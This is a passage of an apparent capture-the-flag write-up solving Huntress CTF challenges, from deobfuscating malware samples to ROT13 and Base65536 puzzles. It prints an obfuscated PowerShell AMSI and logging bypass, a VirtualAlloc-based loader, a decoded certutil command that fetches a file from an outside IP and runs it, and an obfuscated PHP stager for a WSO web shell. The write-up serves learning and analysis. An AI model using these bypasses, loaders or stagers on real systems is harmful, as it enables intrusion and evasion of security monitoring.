$plhF.GetField(((&#39;&#39;&#39;&#39;+&#39;&#39;a{&#39;&#39;+&#39;&#39;0}&#39;&#39;+&#39;&#39;si{4}&#39;&#39;+&#39;&#39;nit{&#39;&#39;+&#39;&#39;1}&#39;&#39;+&#39;&#39;ai&#39;&#39;+&#39;&#39;l{2}{&#39;&#39;+&#39;&#39;3}&#39;&#39;)-f&#39;&#39;m&#39;&#39;,&#39;&#39;F&#39;&#39;,&#39;&#39;e&#39;&#39;,&#39;&#39;d&#39;&#39;,&#39;&#39;I&#39;&#39;),&#39;&#39;NonPublic,Static&#39;&#39;).SetValue($null,$true); }; $lCj=$jXZ4D.GetField(&#39;&#39;cachedGroupPolicySettings&#39;&#39;,&#39;&#39;NonPublic,Static&#39;&#39;); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[&#39;&#39;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\&#39;&#39;+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((&#39;&#39;S{2}{3}&#39;&#39;+&#39;&#39;t&#39;&#39;+&#39;&#39;em&#39;&#39;+&#39;&#39;.Mana&#39;&#39;+&#39;&#39;ge&#39;&#39;+&#39;&#39;ment.{&#39;&#39;+&#39;&#39;5}{4}to&#39;&#39;+&#39;&#39;mation.Scr&#39;&#39;+&#39;&#39;ipt{1}loc{0}&#39;&#39;)-f&#39;&#39;k&#39;&#39;,&#39;&#39;B&#39;&#39;,&#39;&#39;y&#39;&#39;,&#39;&#39;s&#39;&#39;,&#39;&#39;u&#39;&#39;,&#39;&#39;A&#39;&#39;)).GetField(&#39;&#39;signatures&#39;&#39;,&#39;&#39;NonPublic,Static&#39;&#39;).SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((&#39;&#39;H4sI&#39;&#39;+&#39;&#39;AIeJ&#39;&#39;+&#39;&#39;G2UC/+1X&#39;&#39;+&#39;&#39;bU/jOBD+3l9hrS&#39;&#39;+&#39;&#39;IlkU{0}&#39;&#39;+&#39;&#39;VFvb{1}IiFdWqD&#39;&#39;+&#39;&#39;bPRJKS8vR&#39;&#39;+&#39;&#39;brUKy&#39;&#39;+&#39;&#39;TR168TFcQplb//7&#39;&#39;+&#39;&#39;jfNSygJ73{1}lI94F&#39;&#39;+&#39;&#39;IVvwyMx4/M&#39;&#39;+&#39;&#39;7YfT9PYl5TH&#39;&#39;+&#39;&#39;hH7sku8VUnxd&#39;&#39;+&#39;&#39;T3gRMTT/ku&#39;&#39;+&#39;&#39;/fWUSjS3Mzp&#39;</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[...]</span></span></span></code></pre></div></p><p>We will only decrypt the interesting part with is the Base64 string passed to the GzipStream function.
Using CyberChef we are able to reproduce the decryption routine :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png, https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/hotOfPress3.png title="hotOfPress deobfuscate"></p><p>We are presented with a new code snippet containing a new Base 64 to decode:<div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>Byte[]</span><span class=p>]</span><span class=nv>$nLQ2k</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::</span><span class=n>FromBase64String</span><span class=p>(</span><span class=s2>&#34;ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>Uint32</span><span class=p>]</span><span class=nv>$fal3</span> <span class=p>=</span> <span class=mf>0</span>
</span></span><span class=line><span class=cl><span class=nv>$lc98</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Runtime.InteropServices.Marshal</span><span class=p>]::</span><span class=n>GetDelegateForFunctionPointer</span><span class=p>((</span><span class=n>i5P</span> <span class=n>kernel32</span><span class=p>.</span><span class=py>dll</span> <span class=n>VirtualAlloc</span><span class=p>),</span> <span class=p>(</span><span class=n>ma1_D</span> <span class=vm>@</span><span class=p>([</span><span class=no>IntPtr], [UInt32], [UInt32], [UInt32</span><span class=p>])</span> <span class=p>([</span><span class=no>IntPtr</span><span class=p>]))).</span><span class=py>Invoke</span><span class=p>([</span><span class=no>IntPtr</span><span class=p>]::</span><span class=n>Zero</span><span class=p>,</span> <span class=nv>$nLQ2k</span><span class=p>.</span><span class=n>Length</span><span class=p>,</span><span class=n>0x3000</span><span class=p>,</span> <span class=n>0x04</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[...]</span></span></span></code></pre></div></p><p>The string extracted from that base64 is a powershell command : <code>certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=%66%6c%61%67%7b%64%62%66%65%35%66%37%35%35%61%38%39%38%63%65%35%66%32%30%38%38%62%30%38%39%32%38%35%30%62%66%37%7d %TEMP%\f & start /B %TEMP%\f</code>.</p><p>The URL decoding of the parameter provide us with the flag !</p><p><em>flag: flag{dbfe5f755a898ce5f2088b0892850bf7}</em></p><h2 id=baseffff1>BaseFFFF+1</h2><p>This chall was one of the most rabitholish of this CTF. The solution is pretty simple but overthinking these chall is also pretty easy.</p><p>We are presented with an encoded string :
<code>鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸</code>.</p><p>Everything has been tried, custom base creation, changing known base decoding alphabet, etc &mldr;</p><p>But the solution is just to read the title and understand it.
BaseFFFF+1 is basically FFFF in hex which is equal to 65535 +1, that&rsquo;s equal to 65536. So we get Base65536 which is apparently a known base.</p><p>Decoding it with a random online website we get the flag!</p><p><em>flag: flag{716abce880f09b7cdc7938eddf273648}</em></p><h2 id=traffic>Traffic</h2><p>This challenge wasn&rsquo;t the solve the inteded way but it is what it is.</p><p>We know that we are looking for a &ldquo;sketchy site&rdquo;.
So we will go ahead and extract all the data.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/traffic.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/traffic.png, https://www.hato0.xyz/images/ctf/huntress/traffic.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/traffic.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/traffic.png title="Traffic decompress"></p><p>Then the cheat happen, just strings file and grep for <code>sketchy</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/traffic2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/traffic2.png, https://www.hato0.xyz/images/ctf/huntress/traffic2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/traffic2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/traffic2.png title="Traffic decompress"></p><p>So we&rsquo;ve got an intersting domain <code>sketchysite.github.io</code>, which by visiting it give the flag.</p><p><em>flag: flag{8626fe7dcd8d412a80d0b3f0e36afd4a}</em></p><h2 id=caesarmirror>CaesarMirror</h2><p>The chall introduction gives us the hint to look for <code>ROT13</code>.
We have as material the following text:</p><pre><code class=language-text>     Bu obl! Jbj, guvf jnezhc punyyratr fher   bf V !erugrtbg ghc bg ahs sb gby n fnj 
    qrsvavgryl nofbyhgryl nyjnlf ybir gelvat   ftavug rivgnibaav qan jra ch xavug bg 
       gb qb jvgu gur irel onfvp, pbzzba naq   sb genc gfevs ruG !frhdvauprg SGP pvffnyp 
     lbhe synt vf synt{whyvhf_ naq gung vf n   tavuglerir gba fv gv gho gengf gnret 
 gung lbh jvyy arrq gb fbyir guvf punyyratr.    qan rqvu bg tavleg rxvy g'abq V 
  frcnengr rnpu cneg bs gur synt. Gur frpbaq   bq hbl gho _n_av fv tnys rug sb genc 
   arrq whfg n yvggyr ovg zber. Jung rknpgyl   rxnz qan leg bg reru rqhypav rj qyhbuf 
     guvf svyyre grkg ybbx zber ratntvat naq   ?fravyjra qqn rj qyhbuF ?ryvujugebj 
    Fubhyq jr nqq fcnprf naq gel naq znxr vg   uthbar fv fravy lanz jbU ?ynpvegrzzlf 
 gb znxr guvf svyyre grkg ybbx oryvrinoyr? N    n avugvj ferggry sb renhdf qvybf 
 fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq   rug gn gfbzyn rj reN .rz bg uthbar 
   raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq.   }abvgprysre fv tnys ehbl sb genc qevug ruG 
naq ng guvf cbvag lbh fubhyq unir rirelguvat   ebs tnys fvug gvzohf bg qrra hbl gnug 
    cbvagf. Gur ortvaavat vf znexrq jvgu gur   ,rpneo lyehp tavarcb rug qan kvsrec tnys 
  naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol   lyehp tavfbyp n av qar bg ,frebpferqah 
  oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr   fvug bg erucvp enfrnp rug xyvz qyhbp 
            rkgrag?? Fbzrbar trg gung Whyvhf   !ynqrz n lht enfrnP 
</code></pre><p>Doing a ROT 13 translation gives us the decrypted text for the left part:</p><pre><code class=language-text>Oh boy! Wow, this warmup challenge sure   os I !rehtegot tup ot nuf fo tol a saw 
    definitely absolutely always love trying   sgniht evitavonni dna wen pu kniht ot 
       to do with the very basic, common and   fo trap tsrif ehT !seuqinhcet FTC cissalc 
     your flag is flag{julius_ and that is a   gnihtyreve ton si ti tub trats taerg 
 that you will need to solve this challenge.    dna edih ot gniyrt ekil t'nod I 
  separate each part of the flag. The second   od uoy tub _a_ni si galf eht fo trap 
   need just a little bit more. What exactly   ekam dna yrt ot ereh edulcni ew dluohs 
     this filler text look more engaging and   ?senilwen dda ew dluohS ?elihwhtrow 
    Should we add spaces and try and make it   hguone si senil ynam woH ?lacirtemmys 
 to make this filler text look believable? A    a nihtiw srettel fo erauqs dilos 
 simple, monospace-font text file looks good   eht ta tsomla ew erA .em ot hguone 
   end? It looks like it! I hope it is good.   }noitcelfer si galf ruoy fo trap driht ehT 
and at this point you should have everything   rof galf siht timbus ot deen uoy taht 
    points. The beginning is marked with the   ,ecarb ylruc gninepo eht dna xiferp galf 
  and it includes English words separated by   ylruc gnisolc a ni dne ot ,serocsrednu 
  brace. Wow! Now THAT is a CTF! Who knew we   siht ot rehpic raseac eht klim dluoc 
            extent?? Someone get that Julius   !ladem a yug raseaC 
</code></pre><p>Obvserving the resulting right part we can identify that the sentence are reversed and in the wrong order. Re-formating it give us the following:</p><pre><code class=language-text>Caesar guy a medal!   suiluJ taht teg enoemoS ??tnetxe            
 could milk the caesar cipher to this   ew wenk ohW !FTC a si TAHT woN !woW .ecarb  
 underscores, to end in a closing curly   yb detarapes sdrow hsilgnE sedulcni ti dna  
 flag prefix and the opening curly brace,   eht htiw dekram si gninnigeb ehT .stniop    
 that you need to submit this flag for   gnihtyreve evah dluohs uoy tniop siht ta dna
 The third part of your flag is reflection}   .doog si ti epoh I !ti ekil skool tI ?dne   
 enough to me. Are we almost at the   doog skool elif txet tnof-ecapsonom ,elpmis 
 solid square of letters within a    A ?elbaveileb kool txet rellif siht ekam ot 
 symmetrical? How many lines is enough   ti ekam dna yrt dna secaps dda ew dluohS    
 worthwhile? Should we add newlines?   dna gnigagne erom kool txet rellif siht     
 should we include here to try and make   yltcaxe tahW .erom tib elttil a tsuj deen   
 part of the flag is in_a_ but you do   dnoces ehT .galf eht fo trap hcae etarapes  
 I don't like trying to hide and    .egnellahc siht evlos ot deen lliw uoy taht 
 great start but it is not everything   a si taht dna _suiluj{galf si galf ruoy     
 classic CTF techniques! The first part of   dna nommoc ,cisab yrev eht htiw od ot       
 to think up new and innovative things   gniyrt evol syawla yletulosba yletinifed    
 was a lot of fun to put together! I so   erus egnellahc pumraw siht ,woW !yob hO   
</code></pre><p>By combining the two previous text we are getting the following final text:</p><pre><code class=language-text>     Oh boy! Wow, this warmup challenge sure   Caesar guy a medal!
    definitely absolutely always love trying   could milk the caesar cipher to this 
       to do with the very basic, common and   underscores, to end in a closing curly
     your flag is flag{julius_ and that is a   flag prefix and the opening curly brace,
 that you will need to solve this challenge.    that you need to submit this flag for 
  separate each part of the flag. The second   The third part of your flag is reflection} 
   need just a little bit more. What exactly   enough to me. Are we almost at the 
     this filler text look more engaging and   solid square of letters within a 
    Should we add spaces and try and make it   symmetrical? How many lines is enough 
 to make this filler text look believable? A    worthwhile? Should we add newlines? 
 simple, monospace-font text file looks good   should we include here to try and make 
   end? It looks like it! I hope it is good.   part of the flag is in_a_ but you do 
and at this point you should have everything   I don't like trying to hide and 
    points. The beginning is marked with the   great start but it is not everything
  and it includes English words separated by   classic CTF techniques! The first part of
  brace. Wow! Now THAT is a CTF! Who knew we   to think up new and innovative things 
            extent?? Someone get that Julius   was a lot of fun to put together! I so 
</code></pre><p>From there we can extract the flag !</p><p><em>flag: flag{julius_in_a_reflection}</em></p><h2 id=i-wont-let-you-down>I Wont Let You Down</h2><p>For this challenge we are provided with an URL : <code>http://155.138.162.158</code>.
Visiting this website we get a video running a <em>quite</em> taunting popular song.</p><p>When this chall was released, some issue where seen on the instance, and a lot of incoherence has been seen, so we will only consider the things done in the stable part of the chall.</p><p>Doing an nmap, we can find some open ports (nmap is allowed for this chall only).<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 155.138.162.158.vultrusercontent.com <span class=o>(</span>155.138.162.158<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.14s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> filtered ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>8888/tcp open  sun-answerbook
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 15.86 seconds</span></span></code></pre></div></p><p>The SSH might be for Huntress staff to administrate the server, the port 80 is for the web service but the 8888 is quite surprising.</p><p>Looking into it with telnet, got some nice lyrics and the flag !</p><p><em>flag: flag{93671c2c38ee872508770361ace37b02}</em></p><h2 id=php-stagger>PHP Stagger</h2><p>The challenge is to analyze a php file containing a base64 and a piece of code.
The piece of code looks like that :<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=k>function</span> <span class=nf>deGRi</span><span class=p>(</span><span class=nv>$wyB6B</span><span class=p>,</span> <span class=nv>$w3Q12</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span> <span class=nv>$zZ096</span> <span class=o>=</span> <span class=nv>$wyB6B</span><span class=p>;</span> <span class=nv>$pCLb8</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span> <span class=k>for</span> <span class=p>(</span><span class=nv>$fMp3G</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$fMp3G</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$zZ096</span><span class=p>);)</span> <span class=p>{</span> <span class=k>for</span> <span class=p>(</span><span class=nv>$oxWol</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$oxWol</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$w3Q12</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$fMp3G</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$zZ096</span><span class=p>);</span> <span class=nv>$oxWol</span><span class=o>++</span><span class=p>,</span> <span class=nv>$fMp3G</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> <span class=nv>$pCLb8</span> <span class=o>.=</span> <span class=nv>$zZ096</span><span class=p>[</span><span class=nv>$fMp3G</span><span class=p>]</span> <span class=o>^</span> <span class=nv>$w3Q12</span><span class=p>[</span><span class=nv>$oxWol</span><span class=p>];</span> <span class=p>}</span> <span class=p>}</span> <span class=k>return</span> <span class=nv>$pCLb8</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cm>/*iNsGNGYwlzdJjfaQJIGRtTokpZOTeLzrQnnBdsvXYlQCeCPPBElJTcuHmhkJjFXmRHApOYlqePWotTXHMuiuNfUYCjZsItPbmUiXSxvEEovUceztrezYbaOileiVBabK*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$lBuAnNeu5282</span> <span class=o>=</span> <span class=s2>&#34;)o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$gbaylYLd6204</span> <span class=o>=</span> <span class=s2>&#34;LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$fsPwhnfn8423</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$oZjuNUpA325</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>([</span><span class=mi>24</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>26</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>37</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>31</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>   <span class=nv>$fsPwhnfn8423</span> <span class=o>.=</span> <span class=nv>$lBuAnNeu5282</span><span class=p>[</span><span class=nv>$k</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>([</span><span class=mi>26</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>33</span><span class=p>]</span> <span class=k>as</span> <span class=nv>$k</span><span class=p>){</span>
</span></span><span class=line><span class=cl>   <span class=nv>$oZjuNUpA325</span> <span class=o>.=</span> <span class=nv>$lBuAnNeu5282</span><span class=p>[</span><span class=nv>$k</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$k</span> <span class=o>=</span> <span class=nv>$oZjuNUpA325</span><span class=p>(</span><span class=s1>&#39;n&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;o&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;i&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;t&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;c&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;n&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;u&#39;</span><span class=o>.</span><span class=s1>&#39;f&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;_&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;e&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;t&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;a&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;e&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;r&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=s1>&#39;c&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nv>$k</span><span class=p>(</span><span class=s2>&#34;/*XAjqgQvv4067*/&#34;</span><span class=p>,</span> <span class=nv>$fsPwhnfn8423</span><span class=p>(</span> <span class=nx>deGRi</span><span class=p>(</span><span class=nv>$fsPwhnfn8423</span><span class=p>(</span><span class=nv>$gbaylYLd6204</span><span class=p>),</span> <span class=s2>&#34;tVEwfwrN302&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/</span>
</span></span><span class=line><span class=cl>   
</span></span></code></pre></div></p><p>Putting the code in order looks like:<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>xorFunction</span><span class=p>(</span><span class=nv>$string</span><span class=p>,</span> <span class=nv>$key</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$text</span> <span class=o>=</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$outText</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$text</span><span class=p>);</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$j</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=p>(</span><span class=nv>$j</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$key</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$text</span><span class=p>));</span> <span class=nv>$j</span><span class=o>++</span><span class=p>,</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$outText</span> <span class=o>.=</span> <span class=nv>$text</span><span class=p>{</span><span class=nv>$i</span><span class=p>}</span> <span class=o>^</span> <span class=nv>$key</span><span class=p>{</span><span class=nv>$j</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$outText</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$encodedString</span> <span class=o>=</span> <span class=s2>&#34;LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nx>create_function</span><span class=p>(</span><span class=s2>&#34;/*XAjqgQvv4067*/&#34;</span><span class=p>,</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>xorFunction</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$encodedString</span><span class=p>),</span> <span class=s2>&#34;tVEwfwrN302&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=p>();</span>
</span></span><span class=line><span class=cl>   
</span></span></code></pre></div></p><p>Creating this routine in CyberChef gives us the code of an php served web page. Only the last part is interesting:</p><pre><code><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>[</span><span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>actionNetwork</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>wsoHeader</span><span class=p>();</span>
